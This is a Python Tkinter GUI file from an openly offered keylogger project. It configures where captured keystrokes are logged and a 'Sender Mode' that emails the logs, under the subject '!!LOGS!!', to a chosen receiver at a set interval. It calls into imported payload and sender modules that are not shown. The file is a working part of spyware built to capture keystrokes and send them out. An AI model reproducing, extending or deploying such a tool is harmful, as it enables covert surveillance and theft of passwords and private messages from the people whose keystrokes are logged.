# Keylogger: Capture keystrokes
#     Copyright (C) 2023  Muhammad Faizan

#     This program is free software: you can redistribute it and/or modify
#     it under the terms of the GNU General Public License as published by
#     the Free Software Foundation, either version 3 of the License, or
#     (at your option) any later version.

#     This program is distributed in the hope that it will be useful,
#     but WITHOUT ANY WARRANTY; without even the implied warranty of
#     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#     GNU General Public License for more details.

#     You should have received a copy of the GNU General Public License
#     along with this program.  If not, see <https://www.gnu.org/licenses/>.
from tkinter import Tk, StringVar, BooleanVar, IntVar, Label, Checkbutton, Entry, Button, LabelFrame, DISABLED, W , NORMAL
from tkinter.filedialog import asksaveasfilename
from os import path, sep
from webbrowser import open_new_tab
from app import App
from config import AppConfig, MonkeyConfig, PigeonConfig

from paylaod import Monkey
from sender import Pigeon

class GUI:
    def __init__(self) -> None:
        self.top = Tk()
        self.top.title("Keylogger")
        self.top.resizable(width=False, height=False)

        self.sender_mode = BooleanVar(self.top, False)
        self.filename = StringVar(self.top, "")
        self.subject = StringVar(self.top, "!!LOGS!!")
        self.body = StringVar(self.top, "default body text")
        self.sender_email = StringVar(self.top, "")
        self.password = StringVar(self.top, "")
        self.receiver_email = StringVar(self.top, "")
        self.email_frequency = IntVar(self.top, 10)

        self._create_widgets()
        self._update_widgets()

        # Track all variables for changes
        self.sender_mode.trace('w',self._update_widgets)
        self.filename.trace('w',self._update_widgets)
        self.sender_email.trace('w',self._update_widgets)
        self.password.trace('w',self._update_widgets)
        self.receiver_email.trace('w',self._update_widgets)

        self.top.mainloop()

    def _run_program(self):
        self.top.destroy()

        monkey_config = MonkeyConfig()
        monkey_config.filepath = self.filename.get()
       
        pigeon_config = PigeonConfig()
        pigeon_config.filepath = monkey_config.filepath
        pigeon_config.subject = self.subject.get()
        pigeon_config.sender_email = self.sender_email.get()
        pigeon_config.password = self.password.get()
        pigeon_config.receiver_email = self.receiver_email.get()
        pigeon_config.body = self.body.get()
        pigeon_config.debug = False

        app_config = AppConfig()
        app_config.email_frequency = self.email_frequency.get()
        app_config.sender_mode = self.sender_mode.get()
        app_config.debug = False

        App(config=app_config, 
            pigeon_config=pigeon_config, 
            monkey_config=monkey_config)


    def _browse_file(self):
        new_file = asksaveasfilename(
            initialdir=path.expanduser( '~' ) + sep + "Documents",
            defaultextension='.log',
            title="Select Log Output File")
       
        if new_file != "":
            self.filename.set(new_file)

    def _create_widgets(self):
        keylogger_frame = LabelFrame(self.top, text="Keyloger Options", padx=5)
        
        Label(keylogger_frame,
              text="Select a file to save log outuput:").grid(row=0, column=0, columnspan=3, sticky=W)

        Entry(keylogger_frame, textvariable=self.filename, 
              width=47, state=DISABLED, disabledbackground="white", disabledforeground="black").grid(row=1, column=0)

        Button(keylogger_frame, text="Browse",
               command=self._browse_file).grid(row=1, column=1)
        
        keylogger_frame.grid(row=1, column=0)

        Checkbutton(self.top, variable=self.sender_mode, text="Sender Mode").grid(row=2, column=0, sticky=W, pady=5)

        sender_frame = LabelFrame(self.top, text="Mail Options")


        Label(sender_frame,
              text="Sender Email: ").grid(row=1, column=0, sticky=W)
        self.sender_email_entry = Entry(sender_frame, textvariable=self.sender_email, width=30)
        self.sender_email_entry.grid(row=1, column=1)

        Label(sender_frame, text="Password: ").grid(row=2, column=0, sticky=W)
        self.password_entry = Entry(sender_frame, textvariable=self.password, width=30)
        self.password_entry.grid(row=2, column=1)

        Label(sender_frame, text="Receiver Email: ").grid(row=3, column=0, sticky=W)
        self.receiver_email_entry = Entry(sender_frame, textvariable=self.receiver_email, width=30)
        self.receiver_email_entry.grid(row=3, column=1)

        Label(sender_frame, text="Email Subject: ").grid(row=4, column=0, sticky=W)
        self.subject_entry = Entry(sender_frame, textvariable=self.subject, width=30)
        self.subject_entry.grid(row=4, column=1)

        Label(sender_frame, text="Email Body: ").grid(row=5, column=0, sticky=W)
        self.body_entry = Entry(sender_frame, textvariable=self.body, width=30)
        self.body_entry.grid(row=5, column=1)

        Label(sender_frame, text="Email Frequency (every x minutes): ").grid(row=6, column=0, sticky=W)
        self.email_frequency_entry = Entry(sender_frame, textvariable=self.email_frequency, width=30)
        self.email_frequency_entry.grid(row=6, column=1)
        
        sender_frame.grid(row=3, column=0, padx=5)

        self.run_button = Button(self.top, text="Run",
               command=self._run_program, width=5, height=2)
        self.run_button.grid(row=4, column=0, padx=5, pady=5)
        credit = Label(self.top, 
                       text="Author: Muhammad Faizan (github.com/mralpha786)", cursor="hand2")
        credit.grid(row=5, column=0, sticky=W, pady=2, padx=5)
        credit.bind("<Button-1>", 
                    lambda e: open_new_tab("https://www.github.com/mralpha786"))
        
    def _update_widgets(self, *args):
        if self.filename.get()!="":
            if not self.sender_mode.get():
                self.run_button.config(state=NORMAL)
            else:
                if self.sender_email.get() != "" and self.password.get() != "" and self.receiver_email.get() != "":
                    self.run_button.config(state=NORMAL)
                else:
                    self.run_button.config(state=DISABLED)
        else:
            self.run_button.config(state=DISABLED)

        if not self.sender_mode.get():
            self.sender_email_entry.config(state=DISABLED)
            self.password_entry.config(state=DISABLED)
            self.receiver_email_entry.config(state=DISABLED)
            self.subject_entry.config(state=DISABLED)
            self.body_entry.config(state=DISABLED)
            self.email_frequency_entry.config(state=DISABLED)
        else:
            self.sender_email_entry.config(state=NORMAL)
            self.password_entry.config(state=NORMAL)
            self.receiver_email_entry.config(state=NORMAL)
            self.subject_entry.config(state=NORMAL)
            self.body_entry.config(state=NORMAL)
            self.email_frequency_entry.config(state=NORMAL)

if __name__ == '__main__':
    GUI()
